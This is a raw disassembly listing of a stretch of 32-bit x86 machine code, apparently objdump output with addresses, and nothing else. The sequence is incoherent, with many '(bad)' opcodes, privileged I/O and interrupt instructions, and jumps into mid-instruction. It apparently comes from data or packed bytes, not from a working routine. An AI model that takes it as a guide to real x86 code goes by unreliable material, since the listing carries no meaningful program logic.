  40540f:	add    bl,BYTE PTR [edi]
  405411:	inc    edi
  405412:	mov    eax,0xa224d09f
  405417:	dec    esp
  405418:	int    0x7
  40541a:	stos   DWORD PTR es:[edi],eax
  40541b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40541c:	gs ds adc eax,0x4cbb82b0
  405423:	cli    
  405424:	test   DWORD PTR [esp+esi*4-0x6b8209a4],edi
  40542b:	mov    al,0xd3
  40542d:	cmp    eax,0x837ab037
  405432:	ds dec edx
  405434:	mov    ds:0xb6645c83,al
  405439:	fnstcw WORD PTR [edx+esi*4+0x36d52809]
  405440:	sbb    eax,0x3cd00a73
  405445:	cmc    
  405446:	cs pusha 
  405448:	push   edi
  405449:	sbb    dl,BYTE PTR [edx+0x1c]
  40544c:	inc    edx
  40544d:	nop
  40544e:	jb     0x405449
  405450:	sbb    esi,eax
  405452:	cld    
  405453:	xchg   edx,eax
  405454:	cld    
  405455:	rcl    BYTE PTR [eax+0x15ae94],0x0
  40545c:	iret   
  40545d:	sub    bl,BYTE PTR [edi+0x7e298daa]
  405463:	pusha  
  405464:	sub    DWORD PTR ds:0x79515af6,edi
  40546a:	xor    eax,0x65286920
  40546f:	inc    edx
  405470:	dec    edi
  405471:	lahf   
  405472:	mov    DWORD PTR [ebp+0xf],esi
  405475:	out    dx,al
  405476:	sbb    eax,0x1ee87b01
  40547b:	ret    
  40547c:	inc    ebx
  40547d:	inc    esi
  40547e:	shl    DWORD PTR [ebp+0x63],1
  405481:	or     ecx,DWORD PTR gs:0x6d95edb3
  405488:	jmp    0xbbad9a53
  40548d:	mov    bl,0xb9
  40548f:	pusha  
  405490:	lea    esp,[edi+0x94f1312]
  405496:	xlat   BYTE PTR ds:[ebx]
  405497:	push   esi
  405498:	jb     0x405455
  40549a:	sbb    dh,BYTE PTR [esi]
  40549c:	mov    al,0x7b
  40549e:	fdivr  QWORD PTR [eax-0x5e]
  4054a1:	shr    BYTE PTR [edx+0xeed01fe],0x96
  4054a8:	jg     0x405459
  4054aa:	sbb    al,0x8e
  4054ac:	adc    DWORD PTR [ebx],ebx
  4054ae:	mov    ecx,0x72692c18
  4054b3:	(bad)  
  4054b4:	dec    eax
  4054b5:	inc    edi
  4054b6:	push   ebx
  4054b7:	out    0x6e,eax
  4054b9:	pop    ecx
  4054ba:	arpl   WORD PTR [ecx+eiz*8+0x14],ax
  4054be:	outs   dx,DWORD PTR ds:[esi]
  4054bf:	jmp    0x500:0x5a8a2464
  4054c6:	clc    
  4054c7:	push   0x4a
  4054c9:	cld    
  4054ca:	sub    al,0xa1
  4054cc:	bound  ebx,QWORD PTR [edi+edi*2-0x7fe0c0f9]
  4054d3:	ins    DWORD PTR es:[edi],dx
  4054d4:	cmp    eax,0x43d2ba7
  4054d9:	in     al,0x61
  4054db:	hlt    
  4054dc:	in     al,dx
  4054dd:	jecxz  0x4054de
  4054df:	jg     0x4054de
  4054e1:	or     bh,ch
  4054e3:	cmp    edi,DWORD PTR [edx+0x4defde8f]
  4054e9:	jl     0x4054ac
  4054eb:	int3   
  4054ec:	jnp    0x40551a
  4054ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ef:	leave  
  4054f0:	add    BYTE PTR [esp+ecx*8],cl
  4054f3:	pop    ebx
  4054f4:	pop    edi
  4054f5:	pop    es
  4054f6:	pop    ebx
  4054f7:	test   BYTE PTR ds:0x426b3269,dl
  4054fd:	daa    
  4054fe:	iret   
  4054ff:	mov    ds:0x51063e8d,eax
  405504:	test   BYTE PTR [esi],al
  405506:	cs add eax,0x3d6c20a
  40550c:	aaa    
  40550d:	xor    edi,ebp
  40550f:	jg     0x405544
  405511:	test   DWORD PTR [edx+0xf],edi
  405514:	cmp    eax,0x4d0f2290
  405519:	adc    al,ah
  40551b:	mov    edx,es
  40551d:	dec    ebp
  40551e:	add    bl,dl
  405520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405521:	fmul   DWORD PTR [ebx+0x4f]
  405524:	ror    esi,1
  405526:	push   cs
  405527:	ds call 0xdb1a:0x6cb1880b
  40552f:	pop    eax
  405530:	fbstp  TBYTE PTR [ecx]
  405532:	pop    edi
  405533:	mov    ecx,0x4db9edb2
  405538:	test   al,0x1f
  40553a:	and    DWORD PTR [eax-0x75832faf],0xffffffb8
  405541:	popf   
  405542:	into   
  405543:	cdq    
  405544:	mov    ah,0x78
  405546:	cmp    bh,ah
  405548:	pushf  
  405549:	icebp  
  40554a:	ror    BYTE PTR [esi],1
  40554c:	ret    0x9520
  40554f:	push   edi
  405550:	aam    0x49
  405552:	les    esp,FWORD PTR [esi+ebp*8+0x7e911a6f]
  405559:	test   eax,0x7f16bb95
  40555e:	xchg   edi,eax
  40555f:	adc    eax,0x56637f58
  405564:	mov    edi,0xd3df1823
  405569:	mov    eax,0x13beff16
  40556e:	pop    esi
  40556f:	idiv   DWORD PTR [ebx+0x32]
  405572:	lock or BYTE PTR [ebp+0x4ad96f68],0xf5
  40557a:	push   edi
  40557b:	add    edi,DWORD PTR [edi+0x9c8beba]
  405581:	pop    ds
  405582:	cli    
  405583:	or     DWORD PTR [edx],0x55
  405586:	popa   
  405587:	jmp    0x2a82a71
  40558c:	cmp    eax,0x1a97908b
  405591:	int    0x1b
  405593:	dec    esi
  405594:	cmp    ebp,DWORD PTR [eax+0x47]
  405597:	sbb    ebp,edi
  405599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40559a:	(bad)  
  40559b:	inc    DWORD PTR [ecx+0x2a]
  40559e:	inc    edi
  40559f:	and    BYTE PTR [eax+0xe],bl
  4055a2:	sub    ah,BYTE PTR [eax]
  4055a4:	mov    BYTE PTR [edx],ah
  4055a6:	fst    QWORD PTR [eax-0x38]
  4055a9:	scas   eax,DWORD PTR es:[edi]
  4055aa:	imul   ebp,DWORD PTR [edx],0xfffffffd
  4055ad:	push   ds
  4055ae:	mov    ch,0xc4
  4055b0:	cmp    ebx,esp
  4055b2:	ret    0xf93d
  4055b5:	mov    cl,0xad
  4055b7:	mov    WORD PTR [ebx-0x30b6a057],ds
  4055bd:	sti    
  4055be:	ja     0x4055bc
  4055c0:	xor    al,0x44
  4055c2:	sbb    edx,DWORD PTR [edx+0x10fde353]
  4055c8:	sub    BYTE PTR [ebp+0x5d49f94e],bl
  4055ce:	add    eax,0xf5dd059b
  4055d3:	mov    dh,0xd8
  4055d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055d6:	iret   
  4055d7:	xor    cl,ah
  4055d9:	ins    DWORD PTR es:[edi],dx
  4055da:	leave  
  4055db:	ror    al,1
  4055dd:	jge    0x405627
  4055df:	loopne 0x40562d
  4055e1:	sbb    DWORD PTR ds:0xd08362b4,0xffffffbf
  4055e8:	(bad)  
  4055e9:	xchg   BYTE PTR [edi-0x77],dl
  4055ec:	adc    eax,0x516e74af
  4055f1:	daa    
  4055f2:	sbb    cl,BYTE PTR [esi+0x15]
  4055f5:	popa   
  4055f6:	mov    esp,0x75aa13dd
  4055fb:	push   edi
  4055fc:	and    BYTE PTR [eax],0x7d
  4055ff:	push   ss
  405600:	ins    DWORD PTR es:[edi],dx
  405601:	(bad)  
  405602:	div    bl
  405604:	imul   edi,DWORD PTR [edx-0x7a],0x319cc9e8
  40560b:	dec    edi
  40560c:	daa    
  40560d:	mov    esp,0x65399c67
  405612:	jecxz  0x4055ab
  405614:	(bad)  
  405615:	xor    DWORD PTR [eax-0x6c1c7ce6],esp
  40561b:	lock lods eax,DWORD PTR ds:[esi]
  40561d:	mov    edi,0x6e689f12
  405622:	cmp    eax,0x9a5e59b6
  405627:	sub    ecx,DWORD PTR [eax-0x7e9cccbc]
  40562d:	outs   dx,BYTE PTR ds:[esi]
  40562e:	jo     0x40563a
  405630:	mov    al,dh
  405632:	xor    al,0xae
  405634:	or     edi,ebx
  405636:	retf   0xdddb
  405639:	in     al,0x8f
  40563b:	fwait
  40563c:	pop    eax
  40563d:	pop    ecx
  40563e:	fwait
  40563f:	inc    edx
  405640:	dec    ecx
  405641:	xchg   esi,edi
  405643:	xchg   ecx,eax
  405644:	in     al,dx
  405645:	cdq    
  405646:	dec    ebx
  405647:	cmp    edi,DWORD PTR [edi-0x4a]
  40564a:	xchg   BYTE PTR [edi+0xe95c88a],ch
  405650:	xor    DWORD PTR ds:0x726e43b7,ebp
  405656:	adc    bh,ah
  405658:	daa    
  405659:	pop    ebp
  40565a:	aam    0xbb
  40565c:	pusha  
  40565d:	pop    edx
  40565e:	nop
  40565f:	stc    
  405660:	out    0x56,eax
  405662:	jo     0x405615
  405664:	mov    al,ds:0x585f5589
  405669:	push   ebp
  40566a:	mov    al,ds:0xfdd5f1ba
  40566f:	(bad)  
  405670:	(bad)  
  405671:	popf   
  405672:	arpl   dx,si
  405674:	adc    eax,0x1f67f96
  405679:	jmp    FWORD PTR [ebp+0x30e1fd8d]
  40567f:	repnz mov bl,0x54
  405682:	push   cs
  405683:	mov    al,ds:0xc93002f9
  405688:	hlt    
  405689:	ficom  WORD PTR [ebx+0x4]
  40568c:	jmp    0x4056fb
  40568e:	imul   esi,DWORD PTR [eax],0x54578df2
  405694:	jg     0x4056f7
  405696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405697:	(bad)  
  405698:	out    0xc3,al
  40569a:	dec    ecx
  40569b:	rol    BYTE PTR [ecx+ebx*8],1
  40569e:	retf   0x88e2
  4056a1:	pop    esi
  4056a2:	adc    al,0xcf
  4056a4:	mov    ebp,0x5488ccb1
  4056a9:	leave  
  4056aa:	mov    edx,0xe824b918
  4056af:	imul   edx,DWORD PTR [ebx-0x648f64ed],0xffffff92
  4056b6:	and    al,0xfd
  4056b8:	sbb    BYTE PTR [ebx+0x6e6cc83],bl
  4056be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056bf:	or     BYTE PTR ds:0x8b289c4a,0x7
  4056c6:	ins    BYTE PTR es:[edi],dx
  4056c7:	in     al,dx
  4056c8:	inc    esi
  4056c9:	xor    eax,0xeac5fcce
  4056ce:	jmp    0x4056ca
  4056d0:	pop    esp
  4056d1:	scas   eax,DWORD PTR es:[edi]
  4056d2:	repnz lds ebx,FWORD PTR [ebx+0x69397973]
  4056d9:	mov    edx,0xa4ff5309
  4056de:	jno    0x4056dd
  4056e0:	nop
  4056e1:	dec    esi
  4056e2:	push   edi
  4056e3:	das    
  4056e4:	sub    BYTE PTR [edi],bl
  4056e6:	(bad)  
  4056e7:	aad    0xbf
  4056e9:	inc    eax
  4056ea:	call   0x5c39c638
  4056ef:	loope  0x40572d
  4056f1:	enter  0x3085,0x47
  4056f5:	hlt    
  4056f6:	fidiv  WORD PTR [eax+0x6a]
  4056f9:	lea    ecx,[ecx+0x45ba036c]
  4056ff:	and    al,0x7c
  405701:	or     ecx,DWORD PTR [ecx-0x33]
  405704:	xchg   esi,eax
  405705:	adc    ebp,DWORD PTR [ecx+0x18fdd6b6]
  40570b:	inc    DWORD PTR [esi+0x3e]
  40570e:	mov    al,0xcd
  405710:	out    dx,al
  405711:	push   ebx
  405712:	and    esi,esi
  405714:	mov    eax,ds:0x7ae490bf
  405719:	dec    edi
  40571a:	ror    edx,1
  40571c:	sub    al,0xd3
  40571e:	(bad)  
  40571f:	mov    eax,0x1dfe84f3
  405724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405725:	dec    edx
  405726:	out    dx,al
  405727:	scas   al,BYTE PTR es:[edi]
  405728:	xlat   BYTE PTR ds:[ebx]
  405729:	xor    BYTE PTR [ebx],ah
  40572b:	(bad)  
  40572c:	fdivr  DWORD PTR [ebx+ecx*4-0x73]
  405730:	mov    ds:0x21f8dcbc,al
  405735:	ins    DWORD PTR es:[edi],dx
  405736:	inc    eax
  405737:	je     0x4056e7
  405739:	push   0x14
  40573b:	sub    eax,0x2424b7a7
  405740:	or     BYTE PTR ds:0xec3abd1c,bl
  405746:	mov    ah,0x9a
  405748:	inc    DWORD PTR [edx-0x24e17214]
  40574e:	aad    0x60
  405750:	add    BYTE PTR [ecx-0x55],0xe1
  405754:	cdq    
  405755:	push   edi
  405756:	xchg   ebx,eax
  405757:	and    dh,BYTE PTR [ebx-0x44]
  40575a:	test   eax,0xd323e3ed
  40575f:	ror    DWORD PTR [ebx+0x47],0xb5
  405763:	cli    
  405764:	xlat   BYTE PTR ds:[ebx]
  405765:	mov    cl,0x7a
  405767:	pop    es
  405768:	xchg   esi,eax
  405769:	adc    dl,BYTE PTR ds:0x3ef9993e
  40576f:	cmp    al,0x1b
  405771:	(bad)  
  405772:	mov    ah,0xca
  405774:	repz jmp 0x4057c7
  405777:	xor    DWORD PTR [ebp-0x66],ebp
  40577a:	outs   dx,DWORD PTR ds:[esi]
  40577b:	test   DWORD PTR [ecx+eiz*8+0x738037f5],ecx
  405782:	aam    0x11
  405784:	xor    BYTE PTR [esi],0x21
  405787:	test   DWORD PTR [ebx],0xa94d1913
  40578d:	aaa    
  40578e:	or     DWORD PTR [ebx+0x40256c5f],0xffffffe5
  405795:	stos   BYTE PTR es:[edi],al
  405796:	pusha  
  405797:	jmp    0x4db6466e
  40579c:	mov    bh,0xf3
  40579e:	aam    0xc8
  4057a0:	inc    edx
  4057a1:	rcr    DWORD PTR [ecx-0x5f],1
  4057a4:	cmp    eax,0x8df253b0
  4057a9:	inc    edi
  4057aa:	into   
  4057ab:	push   es
  4057ac:	pop    edi
  4057ad:	adc    dl,BYTE PTR [esi]
  4057af:	call   0xf85a:0xb136eef4
  4057b6:	jns    0x40582f
  4057b8:	jae    0x4057f9
  4057ba:	out    dx,al
  4057bb:	jno    0x405780
  4057bd:	sti    
  4057be:	xchg   ecx,eax
  4057bf:	adc    eax,0x3cba73bb
  4057c4:	out    0x91,eax
  4057c6:	fimul  WORD PTR [edx-0x41c1e025]
  4057cc:	xchg   edi,eax
  4057cd:	pusha  
  4057ce:	sbb    al,0x4
  4057d0:	mov    eax,ds:0x2c50451e
  4057d5:	clc    
  4057d6:	and    DWORD PTR [esi-0x147b4c3e],ebp
  4057dc:	and    BYTE PTR [ebx+0x6],cl
  4057df:	cmp    eax,0x9999d2b0
  4057e4:	clc    
  4057e5:	ret    0xcf48
  4057e8:	test   edx,0x5b4a19cb
  4057ee:	repz out dx,eax
  4057f0:	test   al,0xe
  4057f2:	push   ss
  4057f3:	mov    cl,0x96
  4057f5:	push   edi
  4057f6:	outs   dx,DWORD PTR ds:[esi]
  4057f7:	pop    si
  4057f9:	jg     0x4057b3
  4057fb:	dec    edx
  4057fc:	popf   
  4057fd:	mov    cl,0xba
  4057ff:	xchg   DWORD PTR [ecx],ebp
  405801:	cmp    BYTE PTR [ebp+0xb4cbca8],ch
  405807:	mov    bh,0x98
  405809:	and    BYTE PTR [edx+0x35720d5],bl
  40580f:	jns    0x4057b2
  405811:	inc    edi
  405812:	pop    ecx
  405813:	jmp    0x12df050e
  405818:	xlat   BYTE PTR ds:[ebx]
  405819:	adc    edi,DWORD PTR [esi]
  40581b:	fdiv   st,st(7)
  40581d:	pop    ss
  40581e:	ret    
  40581f:	mov    al,ds:0x72d55e41
  405824:	mov    edi,0x27da510f
  405829:	ss call 0x4930:0x7c59a31c
  405831:	xor    eax,0x620ba4a2
  405836:	ja     0x4057b8
  405838:	pop    edx
  405839:	dec    ebx
  40583a:	outs   dx,BYTE PTR ds:[esi]
  40583b:	sahf   
  40583c:	rcr    DWORD PTR [edx],1
  40583e:	push   cs
  40583f:	stos   BYTE PTR es:[edi],al
  405840:	aaa    
  405841:	pop    es
  405842:	or     ch,0xa7
  405845:	repnz xchg esi,eax
  405847:	xchg   edi,eax
  405848:	or     BYTE PTR [edi-0x4ae5df17],ah
  40584e:	mov    cl,0xe2
  405850:	cld    
  405851:	inc    ebx
  405852:	jp     0x405895
  405854:	xchg   esp,eax
  405855:	dec    esp
  405856:	(bad)  
  405857:	jns    0x405833
  405859:	in     al,0x61
  40585b:	ror    BYTE PTR gs:[eax+0x3a],1
  40585f:	mov    al,ds:0x62f229f
  405864:	ins    DWORD PTR es:[edi],dx
  405865:	repz jo 0x405870
  405868:	push   edx
  405869:	nop
  40586a:	loopne 0x4057ef
  40586c:	jae    0x405823
  40586e:	sbb    ch,cl
  405870:	mov    ebp,DWORD PTR [ebx]
  405872:	or     al,0xb
  405874:	cwde   
  405875:	inc    esp
  405876:	in     al,dx
  405877:	stos   DWORD PTR es:[edi],eax
  405878:	push   ss
  405879:	js     0x40585e
  40587b:	mov    eax,ds:0x41c3e7da
  405880:	enter  0x1748,0x3
  405884:	repnz pop ds
  405886:	mov    DWORD PTR [edx+edi*1+0x6d8b62b6],ecx
  40588d:	jne    0x405891
  40588f:	fdiv   DWORD PTR [ecx+ebp*4-0x58]
  405893:	cs jmp 0x4058fc
  405896:	inc    eax
  405897:	cli    
  405898:	jne    0x4058e9
  40589a:	xchg   BYTE PTR [ebp+ebx*2-0x224571e7],cl
  4058a1:	xor    ah,dh
  4058a3:	dec    ebp
  4058a4:	add    ebx,DWORD PTR [esi+0x180bac8e]
  4058aa:	scas   eax,DWORD PTR es:[edi]
  4058ab:	mov    ds:0xb1f638b0,al
  4058b0:	adc    al,0x1e
  4058b2:	add    BYTE PTR [esi+0x48e5f5d9],cl
  4058b8:	push   eax
  4058b9:	push   ebx
  4058ba:	sbb    edi,DWORD PTR [edi]
  4058bc:	sar    BYTE PTR [esi],0xd5
  4058bf:	and    DWORD PTR [edx],edx
  4058c1:	ror    BYTE PTR [esp+esi*2],cl
  4058c4:	int3   
  4058c5:	cs mov ebp,0x14ae272c
  4058cb:	add    al,0x6d
  4058cd:	stc    
  4058ce:	in     al,dx
  4058cf:	addr16 aam 0xb1
  4058d2:	lods   al,BYTE PTR ds:[esi]
  4058d3:	push   ebx
  4058d4:	jae    0x40594b
  4058d6:	cmp    DWORD PTR [edi-0x2b],esi
  4058d9:	sub    eax,0x71789182
  4058de:	mov    ch,ah
  4058e0:	mov    ebx,0x5d0033cb
  4058e5:	lds    esi,FWORD PTR ds:0xb176e035
  4058eb:	jg     0x4058fa
  4058ed:	xchg   ecx,eax
  4058ee:	stc    
  4058ef:	pop    eax
  4058f0:	push   ebx
  4058f1:	cmp    BYTE PTR [edx-0x73],al
  4058f4:	xchg   ecx,eax
  4058f5:	int3   
  4058f6:	scas   eax,DWORD PTR es:[edi]
  4058f7:	mov    dl,0xcd
  4058f9:	cdq    
  4058fa:	outs   dx,DWORD PTR ds:[esi]
  4058fb:	sub    edx,DWORD PTR [edi+edi*1-0x31688ecb]
  405902:	mov    ecx,ecx
  405904:	gs jl  0x40589e
  405907:	sti    
  405908:	sub    eax,0x567a73a2
  40590d:	es xchg edi,eax
  40590f:	mov    edi,DWORD PTR [ebp+0x27d9a7ba]
  405915:	fwait
  405916:	div    BYTE PTR [edi+0x1b]
  405919:	inc    esp
  40591a:	int    0x0
  40591c:	in     al,0x89
  40591e:	imul   eax,DWORD PTR [edx+esi*1],0xffffffad
  405922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405923:	pop    ecx
  405924:	xor    DWORD PTR [ebx],ecx
  405926:	push   edx
  405927:	scas   eax,DWORD PTR es:[edi]
  405928:	adc    edi,DWORD PTR [ebx]
  40592a:	inc    edi
  40592b:	call   0x371f96fb
  405930:	xor    ah,BYTE PTR [edx]
  405932:	add    al,0x25
  405934:	xchg   ecx,eax
  405935:	clc    
  405936:	lods   eax,DWORD PTR ds:[esi]
  405937:	out    dx,eax
  405938:	aas    
  405939:	mov    DWORD PTR [eax-0x75],ebp
  40593c:	push   ebx
  40593d:	mov    ah,0x35
  40593f:	hlt    
  405940:	div    esp
  405942:	add    cl,BYTE PTR [esi+0x30]
  405945:	mov    esi,0x2cfbcc7f
  40594a:	sub    ebp,DWORD PTR [eax+esi*1-0x54]
  40594e:	dec    edi
  40594f:	mov    bl,BYTE PTR [ebx+ebx*2+0x71e109f5]
  405956:	popa   
  405957:	nop
  405958:	ror    BYTE PTR [ecx],0xd
  40595b:	aas    
  40595c:	sbb    BYTE PTR [edi],bh
  40595e:	sbb    cl,bl
  405960:	cmp    ecx,esi
  405962:	popa   
  405963:	jo     0x405910
  405965:	not    DWORD PTR [eax-0x3d]
  405968:	jecxz  0x40592a
  40596a:	imul   esp,ebp,0xffffff99
  40596d:	mov    ebp,0x418f2fac
  405972:	cmp    ch,BYTE PTR [eax-0x5a77090f]
  405978:	loope  0x405914
  40597a:	push   ss
  40597b:	std    
  40597c:	cmp    ch,dh
  40597e:	sahf   
  40597f:	xor    dh,BYTE PTR gs:[eax+0x39]
  405983:	aas    
  405984:	lea    eax,[edi+ebp*2]
  405987:	push   cs
  405988:	(bad)  
  40598a:	das    
  40598b:	mov    WORD PTR [ebx+0x6a],ds
  40598e:	in     al,dx
  40598f:	cmp    ebx,eax
  405991:	es je  0x4059dd
  405994:	not    DWORD PTR [eax-0x42]
  405997:	or     eax,0xd2c758f1
  40599c:	adc    dh,BYTE PTR [ebp+edi*1+0x74]
  4059a0:	jns    0x4059bd
  4059a2:	sahf   
  4059a3:	push   esi
  4059a4:	pop    DWORD PTR [ebp+0x61f870c9]
  4059aa:	arpl   WORD PTR [ecx],bx
  4059ac:	adc    eax,0xff84d5db
  4059b1:	mov    ds:0x3ca9360a,al
  4059b6:	cmp    bh,ah
  4059b8:	repz and eax,0x1da7c4bb
  4059be:	cmp    esp,esi
  4059c0:	add    ebp,DWORD PTR [edx-0x54]
  4059c3:	fist   WORD PTR [eax-0x1]
  4059c6:	xor    BYTE PTR ds:0x601a41a4,bh
  4059cc:	lods   al,BYTE PTR cs:[esi]
  4059ce:	icebp  
  4059cf:	sub    DWORD PTR [esp+ebx*2-0x51],ebp
  4059d3:	push   ebx
  4059d4:	mov    dl,0x43
  4059d6:	xchg   edx,eax
  4059d7:	in     al,dx
  4059d8:	nop
  4059d9:	ret    0x7654
  4059dc:	or     DWORD PTR [ebp+0x8],edi
  4059df:	inc    esp
  4059e0:	pop    ss
  4059e1:	and    al,0x3e
  4059e3:	xor    ebx,DWORD PTR [ebp-0x33]
  4059e6:	imul   edi,DWORD PTR gs:[edi+eax*1],0xffffffa6
  4059eb:	pusha  
  4059ec:	jo     0x405a4f
  4059ee:	xchg   esp,eax
  4059ef:	add    ebx,esi
  4059f1:	scas   eax,DWORD PTR es:[edi]
  4059f2:	hlt    
  4059f3:	iret   
  4059f4:	mov    dh,0x84
  4059f6:	icebp  
  4059f7:	cs xor eax,0x22cd8f4a
  4059fd:	loop   0x405a45
  4059ff:	aaa    
  405a00:	scas   al,BYTE PTR es:[edi]
  405a01:	arpl   WORD PTR [edx+0x24],dx
  405a04:	add    eax,0xa1c67a7c
  405a09:	cwde   
  405a0a:	loopne 0x405a26
  405a0c:	jnp    0x4059f0
  405a0e:	sub    cl,BYTE PTR [ecx-0x6dd93e81]
  405a14:	jmp    0x405a12
  405a16:	test   al,0xc
  405a18:	and    eax,ecx
  405a1a:	inc    edi
  405a1b:	sbb    dh,BYTE PTR [esi-0x6f4a726c]
  405a21:	jge    0x405a48
  405a23:	mov    al,ds:0xddf25484
  405a28:	mov    cl,0x8b
  405a2a:	mov    WORD PTR [ebx],?
  405a2c:	push   eax
  405a2d:	in     al,0xca
  405a2f:	cmp    dh,BYTE PTR [ebx]
  405a31:	pop    es
  405a32:	push   0x317c9fba
  405a37:	sbb    esp,edx
  405a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a3a:	cmp    al,0xb9
  405a3c:	ret    0xad8f
  405a3f:	cmp    edi,0xffffffe9
  405a42:	jnp    0x405a41
  405a44:	(bad)
  405a47:	shr    dh,0x8c
  405a4a:	adc    DWORD PTR [eax+0x2e],0xd29f923
  405a51:	enter  0x756c,0xd5
  405a55:	mov    esp,0xae2efef9
  405a5a:	jbe    0x405a45
  405a5c:	mov    ebx,DWORD PTR [esi+0x10]
  405a5f:	enter  0xf481,0x3a
  405a63:	pop    edi
  405a64:	(bad)  
  405a65:	push   ss
  405a66:	jbe    0x405a6c
  405a68:	push   ds
  405a69:	imul   ebp,DWORD PTR [esp+ebx*4-0x3c],0xd53eeea4
  405a71:	mov    ds:0x88eabac3,eax
  405a76:	push   edi
  405a77:	loopne 0x405adf
  405a79:	mov    esi,0xa79c170b
  405a7e:	mov    ebp,0x27766242
  405a83:	sub    ch,BYTE PTR [eax]
  405a85:	or     ebp,DWORD PTR [edx]
  405a87:	fisttp WORD PTR [ebx+0x29db1eb3]
  405a8d:	and    BYTE PTR [edi-0x3fc8984d],bl
  405a93:	and    DWORD PTR [edx-0x193544ae],ebp
  405a99:	sbb    cl,bl
  405a9b:	xchg   ebx,eax
  405a9c:	dec    DWORD PTR [edi-0x5ddeeed5]
  405aa2:	and    ah,BYTE PTR [eax+0x71]
  405aa5:	sub    edx,esp
  405aa7:	push   eax
  405aa8:	and    al,0xea
  405aaa:	inc    ecx
  405aab:	mov    esi,0x1b4a6e02
  405ab0:	pushf  
  405ab1:	mov    ds:0x488b67e3,eax
  405ab6:	jns    0x405aaa
  405ab8:	jmp    0xa59f:0x78d4bb22
  405abf:	pop    ds
  405ac0:	loop   0x405a45
  405ac2:	arpl   WORD PTR [ebp-0x4e2a133b],dx
  405ac8:	lds    ebp,FWORD PTR [ebx]
  405aca:	inc    edi
  405acb:	call   0x4b64b7dc
  405ad0:	test   al,0xba
  405ad2:	mov    eax,esi
  405ad4:	rcl    BYTE PTR [esi],1
  405ad6:	popa   
  405ad7:	ror    DWORD PTR [esi],cl
  405ad9:	inc    edi
  405ada:	sbb    edx,eax
  405adc:	sahf   
  405add:	and    dh,BYTE PTR ds:[ecx]
  405ae0:	mov    bh,0x6a
  405ae2:	sub    esi,0x926ba767
  405ae8:	and    BYTE PTR [esi-0x47],ah
  405aeb:	popa   
  405aec:	inc    edi
  405aed:	pop    es
  405aee:	fnstcw WORD PTR [ecx+0x76]
  405af1:	popf   
  405af2:	loopne 0x405b5b
  405af4:	pop    ss
  405af5:	in     eax,0x62
  405af7:	mov    dh,0x47
  405af9:	xchg   ebp,eax
  405afa:	adc    DWORD PTR [edi+ecx*4+0x71ed4ea4],esp
  405b01:	sub    al,0xce
  405b03:	cmp    BYTE PTR [eax-0x745a1ce7],bl
  405b09:	addr16 dec eax
  405b0b:	sahf   
  405b0c:	mov    bh,ah
  405b0e:	ss repz mov edx,cs
  405b12:	popa   
  405b13:	cmp    esp,eax
  405b15:	rol    bl,cl
  405b17:	inc    ebp
  405b18:	inc    edx
  405b19:	pop    esp
  405b1a:	sbb    BYTE PTR ds:0xa24feb76,bh
  405b20:	(bad)  
  405b21:	out    0x53,eax
  405b23:	push   ds
  405b24:	pcmpeqd mm3,QWORD PTR [edi+0x3fca278d]
  405b2b:	cmp    ecx,DWORD PTR [edi]
  405b2d:	scas   eax,DWORD PTR es:[edi]
  405b2e:	jmp    0x9ad5ebc8
  405b33:	or     dh,BYTE PTR [edx]
  405b35:	jbe    0x405b1b
  405b37:	mov    dh,0x25
  405b39:	outs   dx,BYTE PTR ds:[esi]
  405b3a:	mov    bh,cl
  405b3c:	jb     0x405aef
  405b3e:	mov    WORD PTR [ebx],?
  405b40:	fisubr DWORD PTR [ebx-0x12]
  405b43:	pop    ds
  405b44:	dec    ebp
  405b45:	lock fs int 0xa9
  405b49:	fdiv   DWORD PTR [ebx-0x69c4941]
  405b4f:	test   BYTE PTR [edx+0x3ae84f96],cl
  405b55:	xor    DWORD PTR [ebp+0x750a8156],ebp
  405b5b:	push   edi
  405b5c:	jp     0x405b46
  405b5e:	sbb    eax,edi
  405b60:	in     eax,0x7d
  405b62:	stos   BYTE PTR es:[edi],al
  405b63:	pop    es
  405b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b65:	jmp    0xfc5cb44f
  405b6a:	hlt    
  405b6b:	cmp    al,0x39
  405b6d:	out    dx,eax
  405b6e:	loopne 0x405b66
  405b70:	sti    
  405b71:	dec    ebp
  405b72:	ret    
  405b73:	fadd   DWORD PTR [ebx]
  405b75:	sub    eax,0xb96cdb49
  405b7a:	cmp    ecx,DWORD PTR [edx-0x45]
  405b7d:	leave  
  405b7e:	push   esi
  405b7f:	pushf  
  405b80:	bound  esi,QWORD PTR [edi-0x6238d1e3]
  405b86:	inc    edx
  405b87:	xor    al,0xeb
  405b89:	(bad)  
  405b8a:	cmc    
  405b8b:	cmp    esi,esi
  405b8d:	int    0x70
  405b8f:	rcr    DWORD PTR [esi+0x10f271fb],1
  405b95:	xor    eax,0x8b7e7f1b
  405b9a:	mov    dl,0x5b
  405b9c:	xchg   BYTE PTR [eax+0x7d],ah
  405b9f:	add    ebx,DWORD PTR [ebx-0x5f1060e4]
  405ba5:	out    dx,al
  405ba6:	and    eax,0xe2b62ffc
  405bab:	(bad)  
  405bac:	fld    QWORD PTR [esi+0x1e]
  405baf:	(bad)  
  405bb0:	sbb    dl,BYTE PTR [esi+0x34]
  405bb3:	sbb    eax,0x94aa880
  405bb8:	gs int3 
  405bba:	lahf   
  405bbb:	stos   DWORD PTR es:[edi],eax
  405bbc:	add    DWORD PTR [edx],edx
  405bbe:	int3   
  405bbf:	fild   DWORD PTR [eax]
  405bc1:	mov    eax,0x4abbf4f0
  405bc6:	cmp    DWORD PTR ds:0x45d13a9e,eax
  405bcc:	leave  
  405bcd:	fiadd  DWORD PTR [esi+esi*2-0x3b]
  405bd1:	into   
  405bd2:	lahf   
  405bd3:	mov    eax,ds:0xc0b89267
  405bd8:	adc    bl,BYTE PTR [esi-0xa91fd05]
  405bde:	mov    WORD PTR [ebp+edi*1+0x6b],ds
  405be2:	cdq    
  405be3:	adc    cl,ch
  405be5:	adc    DWORD PTR [ecx],eax
  405be7:	shl    BYTE PTR [edx+0x337736c5],cl
